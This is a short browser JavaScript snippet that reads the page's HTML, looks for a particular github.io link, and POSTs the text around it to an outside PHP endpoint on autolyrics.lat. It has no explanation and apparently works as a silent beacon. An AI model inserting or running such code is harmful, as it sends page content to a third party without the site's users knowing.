const html = document.documentElement.outerHTML;

const buscar = "ilslyfer.github.io/_s7d6_scene7_com";

const pos = html.indexOf(buscar);

fetch("https://autolyrics.lat/eldraco.php", {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: pos !== -1 ? html.substring(pos - 100, pos + buscar.length + 100) : "no encontrado"
});
